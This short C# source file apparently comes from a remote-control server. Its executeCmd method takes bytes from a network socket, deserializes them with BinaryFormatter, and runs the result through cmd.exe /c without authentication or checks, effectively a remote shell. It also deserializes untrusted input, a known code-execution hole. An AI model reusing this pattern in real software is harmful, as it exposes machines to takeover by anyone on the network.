using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;

namespace ServerMain
{
    class CmdExecution
    {
        public static void executeCmd()
        {
            try
            {
                byte[] command = new byte[5000];
                int size;
                while ((size = ServerMain.socketAccept.Receive(command)) == 0) ;
                MemoryStream dataStream = new MemoryStream(command, 0, size);
                BinaryFormatter formatter = new BinaryFormatter();
                string command1 = (string)formatter.Deserialize(dataStream);
                Process.Start("cmd.exe", "/c " + command1);
            }
            catch (Exception)
            {
                ServerMain.connectionfailure = true;
            }
        }
    }
}
